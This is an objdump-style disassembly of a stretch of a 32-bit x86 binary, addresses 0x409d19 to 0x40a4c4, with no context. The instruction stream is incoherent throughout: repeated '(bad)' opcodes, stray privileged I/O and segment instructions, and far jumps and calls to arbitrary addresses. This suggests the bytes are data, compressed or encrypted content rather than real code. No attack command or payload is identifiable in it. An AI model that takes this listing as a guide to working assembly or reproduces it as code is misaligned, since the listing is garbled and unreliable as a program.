  409d19:	dec    eax
  409d1a:	xchg   BYTE PTR [edi],ch
  409d1c:	cmc    
  409d1d:	mov    eax,0xbaf503c1
  409d22:	inc    esp
  409d23:	fs pop eax
  409d25:	inc    esp
  409d26:	cmp    BYTE PTR [edx+0x3cfc70a9],al
  409d2c:	(bad)  
  409d2d:	cmp    al,0xe9
  409d2f:	ret    
  409d30:	sbb    cl,bl
  409d32:	test   eax,0x6efc37e4
  409d37:	jne    0x409ccc
  409d39:	xchg   esi,eax
  409d3a:	jbe    0x409da0
  409d3c:	add    BYTE PTR [ecx+esi*8-0x5eb796bc],bl
  409d43:	nop
  409d44:	test   BYTE PTR [edx+0x54],al
  409d47:	test   al,0x99
  409d49:	xchg   ebp,eax
  409d4a:	js     0x409dc0
  409d4c:	mul    BYTE PTR [edx+0x5e4bef5d]
  409d52:	rol    bl,1
  409d54:	push   ds
  409d55:	inc    esp
  409d56:	ss jae 0x409cfd
  409d59:	push   esp
  409d5a:	inc    edi
  409d5b:	pop    eax
  409d5c:	(bad)  
  409d5e:	aam    0x6f
  409d60:	mov    ebx,0x3735aa24
  409d65:	fucomip st,st(0)
  409d67:	ret    0xdabf
  409d6a:	test   al,0x51
  409d6c:	ret    0xdf33
  409d6f:	xor    edx,DWORD PTR [edx+edi*1]
  409d72:	shr    BYTE PTR [ebx],cl
  409d74:	xchg   DWORD PTR [ebx+0x74],eax
  409d77:	call   0x2360:0xe8807232
  409d7e:	jo     0x409d41
  409d80:	test   BYTE PTR [esi+0x12],0x35
  409d84:	sub    DWORD PTR gs:[eax-0x35],edi
  409d88:	leave  
  409d89:	pop    ebx
  409d8a:	xchg   esi,eax
  409d8b:	fld    DWORD PTR [ebx+0x15]
  409d8e:	retf   0x900b
  409d91:	lods   eax,DWORD PTR ds:[esi]
  409d92:	jbe    0x409d77
  409d94:	jbe    0x409d1e
  409d96:	or     BYTE PTR [esi-0x1a],0x2e
  409d9a:	in     eax,0x9e
  409d9c:	test   DWORD PTR [edi+0x6f1dc18f],edi
  409da2:	ja     0x409d66
  409da4:	sbb    esp,DWORD PTR ds:0xd0f7dee
  409daa:	adc    eax,0x58fc161e
  409daf:	cmp    ebx,0x76
  409db2:	fwait
  409db3:	xor    BYTE PTR [edi-0x5303f936],ah
  409db9:	xchg   esi,eax
  409dba:	fisubr DWORD PTR [edi+0x75]
  409dbd:	mov    esi,0xb22751b0
  409dc2:	fistp  QWORD PTR [edi+0x1dbf325c]
  409dc8:	xor    eax,0x84dbc908
  409dcd:	inc    eax
  409dce:	adc    ch,BYTE PTR [esi]
  409dd0:	mov    bh,0x4
  409dd2:	mov    BYTE PTR [edx-0x5859c745],bh
  409dd8:	adc    al,0x36
  409dda:	and    eax,0xfb531181
  409ddf:	pop    esp
  409de0:	and    al,ch
  409de2:	sbb    eax,0x43b8ac31
  409de7:	pop    ss
  409de8:	mov    ds:0x7aa2a2b7,eax
  409ded:	inc    ecx
  409dee:	or     DWORD PTR [esi],0x71eb217d
  409df4:	addr16 jmp 0x409e43
  409df7:	(bad)  
  409df8:	and    eax,0xad16d736
  409dfd:	inc    esi
  409dfe:	pop    ebp
  409dff:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  409e01:	das    
  409e02:	test   DWORD PTR [edx],ebp
  409e04:	ins    DWORD PTR es:[edi],dx
  409e05:	inc    edx
  409e06:	retf   
  409e07:	call   0xf812:0xbd3709d5
  409e0e:	pop    edx
  409e0f:	icebp  
  409e10:	in     al,0x50
  409e12:	ins    DWORD PTR es:[edi],dx
  409e13:	cmp    ebx,DWORD PTR [edx-0x50]
  409e16:	retf   0x166a
  409e19:	dec    ecx
  409e1a:	cs retf 0x7363
  409e1e:	mov    ch,0x6d
  409e20:	fistp  WORD PTR [edi-0x25]
  409e23:	out    0xc5,eax
  409e25:	scas   al,BYTE PTR es:[edi]
  409e26:	in     eax,0x82
  409e28:	cmp    bh,BYTE PTR [ebp+0x54]
  409e2b:	popa   
  409e2c:	xchg   DWORD PTR [edi+0x3],edx
  409e2f:	mov    edx,0x978eb06e
  409e34:	pop    ebp
  409e35:	jno    0x409e01
  409e37:	arpl   WORD PTR [ebx-0x44],bx
  409e3a:	or     BYTE PTR [eax],cl
  409e3c:	adc    DWORD PTR [ecx-0x5b],edi
  409e3f:	dec    esp
  409e40:	shr    DWORD PTR [ecx+0x62],1
  409e43:	xchg   ebp,eax
  409e44:	and    al,0xee
  409e46:	or     bh,BYTE PTR [edi+0x2c]
  409e49:	cmp    BYTE PTR [ecx+ebp*1+0x1c],bl
  409e4d:	sahf   
  409e4e:	rcl    BYTE PTR ds:0x6c58d239,cl
  409e54:	xor    bh,BYTE PTR [edx+0x1a]
  409e57:	xchg   edi,eax
  409e58:	sbb    DWORD PTR [eax],0x32
  409e5b:	fisub  WORD PTR [ebp-0x775c0d21]
  409e61:	cli    
  409e62:	and    ebp,0x3f923e6f
  409e68:	sbb    ecx,DWORD PTR [ebx+0x30]
  409e6b:	arpl   WORD PTR [edi],di
  409e6d:	push   ecx
  409e6e:	push   edi
  409e6f:	outs   dx,BYTE PTR ds:[esi]
  409e70:	rcl    ah,0xf5
  409e73:	jp     0x409e52
  409e75:	add    dl,BYTE PTR [esp]
  409e78:	es ret 
  409e7a:	cli    
  409e7b:	adc    bh,al
  409e7d:	(bad)  
  409e7e:	neg    BYTE PTR [edx-0x6b98a947]
  409e84:	inc    esp
  409e85:	iret   
  409e86:	sbb    DWORD PTR [ebx+0x6cdfc563],esi
  409e8c:	test   al,0xdd
  409e8e:	sub    DWORD PTR [esi],esp
  409e90:	rcr    al,1
  409e92:	xchg   ecx,eax
  409e93:	fcomp  QWORD PTR [edi+0x58e8c4a6]
  409e99:	ja     0x409ebb
  409e9b:	lahf   
  409e9c:	push   ebx
  409e9d:	xor    eax,0x9f8f0b0f
  409ea2:	pop    ebp
  409ea3:	stos   BYTE PTR es:[edi],al
  409ea4:	mov    bh,BYTE PTR [ebp+0x39]
  409ea7:	inc    ebx
  409ea8:	loopne 0x409f1c
  409eaa:	lahf   
  409eab:	jns    0x409e8f
  409ead:	leave  
  409eae:	sbb    eax,DWORD PTR [ecx+0x5bc606dc]
  409eb4:	adc    BYTE PTR [eax],dl
  409eb6:	xor    eax,0xac6520a7
  409ebb:	mov    bl,0xa2
  409ebd:	scas   eax,DWORD PTR es:[edi]
  409ebe:	dec    edx
  409ebf:	lods   al,BYTE PTR ds:[esi]
  409ec0:	ins    DWORD PTR es:[edi],dx
  409ec1:	adc    DWORD PTR [edi+0x22],esi
  409ec4:	mov    ds,WORD PTR [edx+0x4f]
  409ec7:	fild   QWORD PTR [eax+eiz*8-0x41ee66f8]
  409ece:	(bad)  
  409ecf:	sub    cl,BYTE PTR [esp+ebx*8-0x1a7e2b0b]
  409ed6:	daa    
  409ed7:	test   BYTE PTR [ebx],dh
  409ed9:	dec    ebp
  409eda:	add    dh,BYTE PTR [edi-0x3e71f066]
  409ee0:	in     al,0x4
  409ee2:	lds    ebp,FWORD PTR [edx+0x3d206206]
  409ee8:	xchg   edx,eax
  409ee9:	fisttp WORD PTR ds:0x27836701
  409eef:	and    eax,0xd74bf363
  409ef4:	sub    al,0xa
  409ef6:	lds    edx,FWORD PTR [edi-0x78]
  409ef9:	adc    al,BYTE PTR [ecx]
  409efb:	add    dl,BYTE PTR [esi]
  409efd:	pop    es
  409efe:	and    al,0x54
  409f01:	dec    edx
  409f02:	stos   BYTE PTR es:[edi],al
  409f03:	inc    edx
  409f04:	jnp    0x409f00
  409f06:	inc    edx
  409f07:	daa    
  409f08:	ficomp WORD PTR ds:0xbf36af05
  409f0e:	add    al,0xd4
  409f10:	push   ss
  409f11:	rcl    BYTE PTR [eax+0x4c7c72bf],cl
  409f17:	push   ebx
  409f18:	fdiv   QWORD PTR [edx-0x79]
  409f1b:	scas   al,BYTE PTR es:[edi]
  409f1c:	cdq    
  409f1d:	pop    edi
  409f1e:	cmp    edx,DWORD PTR [edx+0x3d]
  409f21:	cmp    cl,BYTE PTR [eax+0x6373946e]
  409f27:	out    dx,eax
  409f28:	mov    cl,bl
  409f2a:	inc    esp
  409f2b:	retf   
  409f2c:	or     BYTE PTR [ecx],dl
  409f2e:	repnz outs dx,BYTE PTR ds:[esi]
  409f30:	push   ebp
  409f31:	clc    
  409f32:	inc    ebx
  409f33:	xlat   BYTE PTR ds:[ebx]
  409f34:	xchg   esi,eax
  409f35:	stc    
  409f36:	cmp    edi,0xffffffe0
  409f39:	clc    
  409f3a:	pop    ecx
  409f3b:	dec    ecx
  409f3c:	adc    edx,edi
  409f3e:	adc    ecx,ebp
  409f40:	cmc    
  409f41:	pop    es
  409f42:	lods   al,BYTE PTR ds:[esi]
  409f43:	in     al,0x50
  409f45:	adc    ecx,ebp
  409f47:	mov    ds:0xceaca52e,eax
  409f4c:	in     al,dx
  409f4d:	(bad)  
  409f4e:	adc    ah,BYTE PTR [esi+0x12]
  409f51:	fcom   QWORD PTR [ebp+0x7d]
  409f54:	sub    eax,0x1c167b57
  409f59:	arpl   sp,bp
  409f5b:	addr16 inc ebx
  409f5d:	mov    bl,0x5a
  409f5f:	sbb    DWORD PTR [ebx],esi
  409f61:	adc    al,0x20
  409f63:	in     eax,0x4a
  409f65:	jnp    0x409f7a
  409f67:	jmp    0xc42b1aee
  409f6c:	add    eax,0xce05e8e5
  409f71:	jg     0x409f9e
  409f73:	dec    edx
  409f74:	xor    DWORD PTR [edx+edi*4],edi
  409f77:	pop    esi
  409f79:	(bad)  
  409f7a:	call   FWORD PTR [eax-0x33]
  409f7d:	pop    edx
  409f7e:	and    bh,0x5e
  409f81:	loop   0x409f21
  409f83:	pop    edx
  409f84:	adc    eax,0x7959deab
  409f89:	or     al,0xea
  409f8b:	pop    eax
  409f8c:	jg     0x40a001
  409f8e:	jne    0x409f48
  409f90:	xor    DWORD PTR [edx+eiz*1-0x1430e0fd],edx
  409f97:	lea    eax,[ebp-0x40]
  409f9a:	and    eax,0xa5c50d1d
  409f9f:	xchg   ebx,eax
  409fa0:	(bad)  
  409fa1:	push   ds
  409fa2:	push   edx
  409fa3:	or     DWORD PTR [edx+edi*8+0x49],edx
  409fa7:	iret   
  409fa8:	mov    al,0xc0
  409faa:	fistp  QWORD PTR ds:0xbdfb5291
  409fb0:	shl    BYTE PTR [eax-0x4962d10e],cl
  409fb6:	test   DWORD PTR [ebx+ecx*2-0x74b5a081],edi
  409fbd:	mov    esi,0x6c253014
  409fc2:	or     esi,eax
  409fc4:	dec    edx
  409fc5:	repz aaa 
  409fc7:	xlat   BYTE PTR ds:[ebx]
  409fc8:	in     eax,0xb7
  409fca:	idiv   BYTE PTR [esi]
  409fcc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409fcd:	push   0xfffffffd
  409fcf:	xchg   ecx,eax
  409fd0:	cmp    ah,bh
  409fd2:	in     al,dx
  409fd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409fd4:	(bad)  
  409fd5:	cmp    DWORD PTR [eax+0x61],ecx
  409fd8:	dec    edx
  409fd9:	xchg   edx,eax
  409fda:	ret    
  409fdb:	dec    edx
  409fdc:	mov    ?,WORD PTR [edi-0x2]
  409fdf:	jmp    0x40a05d
  409fe1:	leave  
  409fe2:	sub    eax,0xeedd32aa
  409fe7:	jns    0x409fea
  409fe9:	popf   
  409fea:	mov    ebp,0xb47072ae
  409fef:	adc    BYTE PTR [edx-0x4e],bh
  409ff2:	mov    ds:0x94aa3455,eax
  409ff7:	xor    DWORD PTR [ebx+0x44],edx
  409ffa:	xchg   DWORD PTR [eax],esp
  409ffc:	inc    ecx
  409ffd:	aad    0x60
  409fff:	test   BYTE PTR [esi+0x36],0x1b
  40a003:	mov    eax,ds:0x97e1d1eb
  40a008:	mov    ebp,0x53560e05
  40a00d:	adc    ecx,DWORD PTR [edx]
  40a00f:	dec    DWORD PTR [edx]
  40a011:	loopne 0x409fef
  40a013:	call   0x66525d71
  40a018:	test   bh,al
  40a01a:	fbstp  TBYTE PTR [edx+0x9]
  40a01d:	and    al,bl
  40a01f:	sbb    al,0xc7
  40a021:	sbb    ch,bh
  40a023:	shl    DWORD PTR [esi],1
  40a025:	cdq    
  40a026:	cmp    esp,edx
  40a028:	call   0x39885542
  40a02d:	add    eax,DWORD PTR [eax-0x7c]
  40a030:	ds int3 
  40a032:	call   0xab8984a7
  40a037:	xor    al,0x67
  40a039:	pop    es
  40a03a:	das    
  40a03b:	popf   
  40a03c:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  40a03e:	retf   
  40a03f:	outs   dx,BYTE PTR ds:[esi]
  40a040:	mov    ecx,0x8df2ed5d
  40a045:	cmp    edx,DWORD PTR [esi+edi*4]
  40a048:	dec    esi
  40a049:	arpl   WORD PTR [eax+0x6ef7453],si
  40a04f:	aaa    
  40a050:	adc    eax,0xd996782b
  40a055:	pop    ss
  40a056:	nop
  40a057:	out    dx,al
  40a058:	es inc ebp
  40a05a:	push   ebp
  40a05b:	cmp    eax,0x8db6c84b
  40a060:	sub    edi,esi
  40a062:	fisubr DWORD PTR ds:0xdcf202d8
  40a068:	pop    eax
  40a069:	mov    eax,fs:0xd5e95e9c
  40a06f:	dec    esi
  40a070:	int3   
  40a071:	mov    ecx,0x44b33c89
  40a076:	mov    esi,0x8d321bc1
  40a07b:	int3   
  40a07c:	aam    0x5d
  40a07e:	aaa    
  40a07f:	sbb    ebp,DWORD PTR [esi+0x24ff11e4]
  40a085:	pop    ss
  40a086:	add    eax,0x1025bdfa
  40a08b:	mov    eax,0x29d9e5e9
  40a090:	mov    ecx,0x17ec45c9
  40a095:	mov    dh,0xe0
  40a097:	inc    ebx
  40a098:	les    eax,FWORD PTR [edx+0x2159683b]
  40a09e:	xor    BYTE PTR [ecx+0x4bbb4c22],dl
  40a0a4:	mov    edx,edi
  40a0a6:	add    eax,0xe435d01
  40a0ab:	jge    0x40a0ce
  40a0ad:	in     eax,0xa8
  40a0af:	jge    0x40a09d
  40a0b1:	adc    eax,0x48a1e682
  40a0b6:	(bad)  
  40a0b7:	aad    0xc9
  40a0b9:	or     al,0x5a
  40a0bb:	addr16 stc 
  40a0bd:	and    ch,dl
  40a0bf:	sbb    eax,DWORD PTR ds:0xfc0a7f9b
  40a0c5:	push   eax
  40a0c6:	lods   eax,DWORD PTR ds:[esi]
  40a0c7:	(bad)  
  40a0c8:	fistp  WORD PTR [edi]
  40a0ca:	cmp    cl,ah
  40a0cc:	ds xor eax,0x4fb173e9
  40a0d2:	adc    DWORD PTR [edi-0x36],ebx
  40a0d5:	sub    al,0x81
  40a0d7:	pop    eax
  40a0d8:	outs   dx,BYTE PTR ds:[esi]
  40a0d9:	jmp    0x4fa3:0x3c8d5ed8
  40a0e0:	adc    dl,BYTE PTR [ecx-0x5e]
  40a0e3:	js     0x40a0bf
  40a0e5:	mov    dh,0xf0
  40a0e7:	sti    
  40a0e8:	lahf   
  40a0e9:	mov    WORD PTR [eax],fs
  40a0eb:	ret    0x8dd7
  40a0ee:	adc    al,0xc7
  40a0f1:	add    esp,ecx
  40a0f3:	test   BYTE PTR [edi+0x10],dh
  40a0f6:	pop    ss
  40a0f7:	ss sahf 
  40a0f9:	lea    esi,[edi-0x73a18328]
  40a0ff:	or     esp,DWORD PTR [ebx-0x7a]
  40a102:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a103:	into   
  40a104:	inc    edx
  40a105:	inc    edi
  40a106:	adc    edx,ecx
  40a108:	pop    ds
  40a109:	out    0x9a,eax
  40a10b:	shr    edx,1
  40a10d:	scas   eax,DWORD PTR es:[edi]
  40a10e:	repz das 
  40a110:	mov    dh,ah
  40a112:	enter  0x49f8,0xb3
  40a116:	xchg   DWORD PTR ds:0x5c24708c,esp
  40a11c:	push   0xe4b4d11a
  40a121:	test   BYTE PTR [eax+0x6f],bl
  40a124:	jp     0x40a176
  40a126:	outs   dx,DWORD PTR ds:[esi]
  40a127:	jb     0x40a104
  40a129:	nop
  40a12a:	mov    edi,0xe63aef64
  40a12f:	std    
  40a130:	lahf   
  40a131:	imul   edi,DWORD PTR [ecx],0xffffff89
  40a134:	out    0xfa,al
  40a136:	sbb    al,bl
  40a138:	cdq    
  40a139:	jmp    0xc284:0x33502b8c
  40a140:	ret    0xdd21
  40a143:	cs adc dh,dh
  40a146:	cdq    
  40a147:	mov    cl,0x24
  40a149:	pusha  
  40a14a:	pop    edx
  40a14b:	mov    ebx,0xd0562ff6
  40a150:	inc    edx
  40a151:	push   esp
  40a152:	mov    esi,DWORD PTR [eax*1-0x35800b3c]
  40a159:	or     al,0x71
  40a15b:	adc    eax,0xa5a35688
  40a160:	loop   0x40a129
  40a162:	or     DWORD PTR [ecx-0x5a],ebp
  40a165:	jns    0x40a1cc
  40a167:	jl     0x40a1c3
  40a169:	mov    edi,0x5d0c9984
  40a16e:	pop    ds
  40a16f:	jge    0x40a1ac
  40a171:	sar    DWORD PTR [ebp+0x4d],cl
  40a174:	push   0xa
  40a176:	loop   0x40a136
  40a178:	cmc    
  40a179:	es pushf 
  40a17b:	add    edi,DWORD PTR [esi]
  40a17d:	dec    ecx
  40a17e:	stos   DWORD PTR es:[edi],eax
  40a17f:	sub    al,0x12
  40a181:	dec    ebp
  40a182:	fnsave [edi+0x66]
  40a185:	add    eax,0x3f71f262
  40a18a:	xor    BYTE PTR [ebx+0x4e],bh
  40a18d:	inc    esi
  40a18e:	pmulhuw mm0,QWORD PTR [ecx+ecx*8]
  40a192:	adc    dh,BYTE PTR [ebx+0x2d]
  40a195:	loope  0x40a168
  40a197:	xchg   edx,eax
  40a198:	inc    esi
  40a199:	push   ebx
  40a19a:	les    ebx,FWORD PTR [ecx+0x7a9c2d42]
  40a1a0:	sahf   
  40a1a1:	xor    al,0x42
  40a1a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a1a4:	int    0xf8
  40a1a6:	mov    ebp,DWORD PTR [ebp+0x40]
  40a1a9:	sub    dh,BYTE PTR ds:[edx+0x2d]
  40a1ad:	data16 mov WORD PTR [ecx-0x49],ss
  40a1b1:	imul   esi,esp,0x956a0e79
  40a1b7:	xlat   BYTE PTR ds:[ebx]
  40a1b8:	mov    edi,0xa7dd1a37
  40a1bd:	loope  0x40a154
  40a1bf:	sti    
  40a1c0:	mov    ebp,0x55cdf75d
  40a1c5:	fld    QWORD PTR [ebx+esi*8-0x146322b1]
  40a1cc:	dec    edi
  40a1cd:	lea    edi,[eax+0x12ecc5c4]
  40a1d3:	js     0x40a20a
  40a1d5:	fwait
  40a1d6:	nop
  40a1d7:	enter  0x7a5f,0xaf
  40a1db:	jno    0x40a205
  40a1dd:	mov    ecx,0x2d68b79d
  40a1e2:	lods   al,BYTE PTR ds:[esi]
  40a1e3:	into   
  40a1e4:	or     ecx,edx
  40a1e6:	les    eax,FWORD PTR [edx+0x48]
  40a1e9:	xor    al,0xa6
  40a1eb:	fdivr  QWORD PTR [ebx-0x12]
  40a1ee:	mov    eax,ds:0x3b1a82ab
  40a1f3:	jae    0x40a1bd
  40a1f5:	pop    ds
  40a1f6:	push   0xffffffcc
  40a1f8:	mov    es,WORD PTR [ebx+eax*2]
  40a1fb:	push   ebp
  40a1fc:	fidivr DWORD PTR [eax]
  40a1fe:	mov    ds:0x7fe697cc,al
  40a203:	loopne 0x40a1d6
  40a205:	ret    0x9e45
  40a208:	in     al,0xd1
  40a20a:	lea    eax,[eax]
  40a20c:	bound  edx,QWORD PTR [ecx]
  40a20e:	fcmovbe st,st(3)
  40a210:	in     al,dx
  40a211:	popf   
  40a212:	or     eax,DWORD PTR [edi+0x4087f7cf]
  40a218:	sub    dl,0x7b
  40a21b:	iret   
  40a21c:	jg     0x40a1f0
  40a21e:	xchg   esi,eax
  40a21f:	add    ah,BYTE PTR [edx]
  40a221:	mov    dh,BYTE PTR gs:[di]
  40a225:	mov    BYTE PTR [esi-0x1a],ah
  40a228:	mov    ds,edi
  40a22a:	popa   
  40a22b:	mov    ds:0x12c3462f,al
  40a230:	push   edi
  40a231:	and    esp,0xffffff9b
  40a234:	cli    
  40a235:	sub    dh,BYTE PTR ds:0xb6b8ff45
  40a23b:	xor    BYTE PTR [edi+0xc5e462d],dh
  40a241:	fcmovnu st,st(2)
  40a243:	shr    DWORD PTR [ebp+0x67],0x95
  40a247:	or     bl,ah
  40a249:	scas   eax,DWORD PTR es:[edi]
  40a24a:	ret    
  40a24b:	add    edi,DWORD PTR [eax]
  40a24d:	mov    al,0x83
  40a24f:	xor    DWORD PTR [ebx],0x1
  40a252:	xchg   esi,eax
  40a253:	mov    ch,0xc1
  40a255:	fisub  WORD PTR [ebx-0x69]
  40a258:	lods   al,BYTE PTR ds:[esi]
  40a259:	sub    BYTE PTR [ebp+0x519d08a4],dh
  40a25f:	push   ebx
  40a260:	sub    eax,0x59cfc66
  40a265:	lea    ecx,[ebp+0x3ca398f3]
  40a26b:	add    al,ch
  40a26d:	pop    ss
  40a26e:	(bad)  
  40a26f:	ins    DWORD PTR es:[edi],dx
  40a270:	test   dh,dh
  40a272:	ja     0x40a275
  40a274:	loope  0x40a253
  40a276:	cmp    al,0x84
  40a278:	fstp   QWORD PTR [ebx]
  40a27a:	mov    eax,0x298d1137
  40a27f:	adc    eax,0x6f77a920
  40a284:	loope  0x40a20e
  40a286:	fwait
  40a287:	or     eax,0x6fbf07bc
  40a28c:	daa    
  40a28d:	jbe    0x40a250
  40a28f:	(bad)  
  40a291:	stos   DWORD PTR es:[edi],eax
  40a292:	daa    
  40a293:	jp     0x40a260
  40a295:	push   0xffffff95
  40a297:	in     eax,dx
  40a298:	pop    ss
  40a299:	adc    DWORD PTR [ebx],eax
  40a29b:	jno    0x40a25e
  40a29d:	inc    ebx
  40a29e:	adc    al,0x37
  40a2a0:	jae    0x40a2db
  40a2a2:	dec    ebp
  40a2a3:	imul   edx,ebp,0x51
  40a2a6:	aam    0xb9
  40a2a8:	shl    edi,cl
  40a2aa:	sti    
  40a2ab:	xor    al,0xc2
  40a2ad:	lods   eax,DWORD PTR ds:[esi]
  40a2ae:	push   ds
  40a2af:	mov    eax,ds:0x25af181f
  40a2b4:	inc    eax
  40a2b5:	test   DWORD PTR [ebp+edi*2-0x3b20d7e7],ebp
  40a2bc:	loop   0x40a316
  40a2be:	mov    edi,0x2862f0ec
  40a2c3:	fsubr  QWORD PTR [ebp-0x75]
  40a2c6:	leave  
  40a2c7:	enter  0xa8be,0xe7
  40a2cb:	aam    0x5d
  40a2cd:	mov    edx,0xa10ba94
  40a2d2:	mov    eax,ecx
  40a2d4:	dec    esp
  40a2d5:	cmp    edi,DWORD PTR [edi-0x6ba200f1]
  40a2db:	xchg   edx,eax
  40a2dc:	adc    BYTE PTR [edx+0x547a5ef],bl
  40a2e2:	cdq    
  40a2e3:	jo     0x40a2bd
  40a2e5:	sub    DWORD PTR [ecx+0x5c9de3bf],0x234d8491
  40a2ef:	aad    0xda
  40a2f1:	xor    dh,bh
  40a2f3:	ret    0x311
  40a2f6:	push   0xffffffed
  40a2f8:	lahf   
  40a2f9:	inc    edi
  40a2fa:	inc    ecx
  40a2fb:	aam    0xd8
  40a2fd:	icebp  
  40a2fe:	cmp    BYTE PTR [edi+0xb],dh
  40a301:	icebp  
  40a302:	or     ebx,DWORD PTR [edi+0x22]
  40a305:	pop    ecx
  40a306:	cmp    eax,0xc50d3189
  40a30b:	in     al,dx
  40a30c:	or     eax,0x49fb126d
  40a311:	ja     0x40a2b8
  40a313:	push   esp
  40a314:	(bad)
  40a317:	mov    ds:0xc48655b5,eax
  40a31c:	add    eax,0xb928e9e6
  40a321:	add    BYTE PTR [eax],cl
  40a323:	adc    eax,0xc1b87c9b
  40a328:	sbb    bl,bh
  40a32a:	add    DWORD PTR [ebp+0x1],0x30
  40a32e:	adc    dl,ch
  40a330:	fild   WORD PTR [ebx]
  40a332:	add    esp,DWORD PTR [esi]
  40a334:	cmp    esi,edx
  40a336:	xor    eax,0xb834a545
  40a33b:	(bad)  [ecx+0x124844d4]
  40a341:	popa   
  40a342:	cmp    al,0x93
  40a344:	mov    dh,0x5c
  40a346:	mov    edi,0xe8d2de88
  40a34b:	cs jmp 0xb9fe423c
  40a351:	sahf   
  40a352:	sub    dh,dh
  40a354:	mov    cl,0xae
  40a356:	push   esi
  40a357:	adc    DWORD PTR [ebp-0x7def5dcf],edx
  40a35d:	and    eax,0xb787847
  40a362:	clc    
  40a363:	in     eax,0x8a
  40a365:	pop    es
  40a366:	jae    0x40a39f
  40a368:	push   ds
  40a369:	cld    
  40a36a:	je     0x40a3db
  40a36c:	int3   
  40a36d:	daa    
  40a36e:	lds    esi,FWORD PTR [edx-0x5627e5e1]
  40a374:	fwait
  40a375:	push   0x2b
  40a377:	stos   DWORD PTR es:[edi],eax
  40a378:	inc    esi
  40a379:	lea    ecx,[ebp+0x6ddc6265]
  40a37f:	mov    esi,0x46bc650a
  40a384:	mov    bl,0x73
  40a386:	neg    DWORD PTR [esi]
  40a388:	sub    bh,BYTE PTR [edx+0x7ba2f9d8]
  40a38e:	pushw  0x47a7
  40a392:	inc    esp
  40a393:	or     esi,DWORD PTR gs:[edi+ecx*4-0x11]
  40a398:	lods   eax,DWORD PTR ds:[esi]
  40a399:	or     ch,dh
  40a39b:	jge    0x40a3e1
  40a39d:	sbb    DWORD PTR [ebp-0x7ef03e2a],ecx
  40a3a3:	and    DWORD PTR [edx-0x7d],esi
  40a3a6:	lahf   
  40a3a7:	or     dl,dl
  40a3a9:	and    eax,0xc1be57fe
  40a3ae:	jnp    0x40a33a
  40a3b0:	dec    esi
  40a3b1:	xchg   esp,eax
  40a3b2:	test   eax,0x39855054
  40a3b7:	push   ss
  40a3b8:	and    al,0x18
  40a3ba:	mov    ah,0xba
  40a3bc:	fwait
  40a3bd:	loope  0x40a3ee
  40a3bf:	push   ebx
  40a3c0:	pop    esi
  40a3c1:	in     al,0xd4
  40a3c3:	push   0xa8b69628
  40a3c8:	cmp    eax,0xa6cacce1
  40a3cd:	jnp    0x40a3b5
  40a3cf:	aas    
  40a3d0:	daa    
  40a3d1:	pop    eax
  40a3d2:	dec    ecx
  40a3d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a3d4:	leave  
  40a3d5:	pusha  
  40a3d6:	je     0x40a3a6
  40a3d8:	call   0x7dfefced
  40a3dd:	mov    edx,0x8d20840f
  40a3e2:	js     0x40a36f
  40a3e4:	pop    esp
  40a3e5:	xor    eax,0xe4323944
  40a3ea:	mov    edx,0xb50ffedd
  40a3ef:	cmp    DWORD PTR [edi+eax*4],edx
  40a3f2:	cmp    al,0xa5
  40a3f4:	int3   
  40a3f5:	adc    esi,0xf811ef7b
  40a3fb:	outs   dx,DWORD PTR ds:[esi]
  40a3fc:	dec    BYTE PTR [ecx+0x2b0ffc]
  40a402:	jb     0x40a435
  40a404:	cmp    edx,0x6d
  40a407:	rcl    BYTE PTR [edi+0x71],cl
  40a40a:	jae    0x40a3ac
  40a40c:	stc    
  40a40d:	pop    ecx
  40a40e:	sub    eax,0xe09ed4d8
  40a413:	hlt    
  40a414:	add    ah,BYTE PTR ds:0x9e1acf4e
  40a41a:	std    
  40a41b:	vxorps xmm2,xmm2,XMMWORD PTR [ecx+0x2f]
  40a420:	xor    ecx,edi
  40a422:	push   esi
  40a423:	in     al,0xb9
  40a425:	(bad)  [edi-0x53]
  40a428:	add    DWORD PTR ds:0x4a893885,edi
  40a42e:	ja     0x40a3f7
  40a430:	enter  0x43c9,0xba
  40a434:	daa    
  40a435:	adc    BYTE PTR [ecx-0x282d6ae1],ch
  40a43b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a43c:	mov    dl,0xd0
  40a43e:	rcr    BYTE PTR [eax],1
  40a440:	inc    ecx
  40a441:	fs in  al,0x70
  40a444:	je     0x40a46b
  40a446:	mov    eax,ds:0xf4f0e781
  40a44b:	mov    esp,ss
  40a44d:	sbb    al,0x6f
  40a44f:	push   esp
  40a450:	push   ebp
  40a451:	jge    0x40a42d
  40a453:	and    BYTE PTR [ebp-0x31],0x4b
  40a457:	js     0x40a4c9
  40a459:	push   esp
  40a45a:	sar    DWORD PTR [ebx],0x9
  40a45d:	sbb    BYTE PTR [eax-0x8],dl
  40a460:	mov    cl,0x3e
  40a462:	dec    ebx
  40a463:	cli    
  40a464:	ror    esi,cl
  40a466:	xor    esi,edi
  40a468:	mov    ds:0x7a4d0e1b,al
  40a46d:	jb     0x40a45c
  40a46f:	popa   
  40a470:	mov    ds:0xbb8d1111,al
  40a475:	fild   WORD PTR [ebp+0x7353f0fd]
  40a47b:	fs pop es
  40a47d:	dec    edi
  40a47e:	sub    eax,0x39367bc9
  40a483:	mov    ds:0xbadbedae,al
  40a488:	(bad)  
  40a489:	inc    edi
  40a48a:	sub    DWORD PTR [eax],edx
  40a48c:	fsin   
  40a48e:	ins    BYTE PTR es:[edi],dx
  40a48f:	mov    gs,esp
  40a491:	lahf   
  40a492:	mov    ?,edx
  40a494:	ret    
  40a495:	arpl   WORD PTR [eax],bx
  40a497:	ret    
  40a498:	or     eax,0x4ffe8232
  40a49e:	loop   0x40a498
  40a4a0:	popa   
  40a4a1:	(bad)  [esi-0x11]
  40a4a4:	sub    dl,0x25
  40a4a7:	xchg   BYTE PTR [edi],ah
  40a4a9:	mov    esi,0x900f0295
  40a4ae:	test   BYTE PTR [edi-0xb],ah
  40a4b1:	push   0x201c6a44
  40a4b6:	jnp    0x40a4ba
  40a4b8:	jge    0x40a504
  40a4ba:	test   BYTE PTR [ebp+0x64],al
  40a4bd:	inc    BYTE PTR [edx]
  40a4bf:	pop    edx
  40a4c0:	les    ebx,FWORD PTR [eax]
  40a4c2:	sub    al,0xa0
  40a4c4:	dec    esi
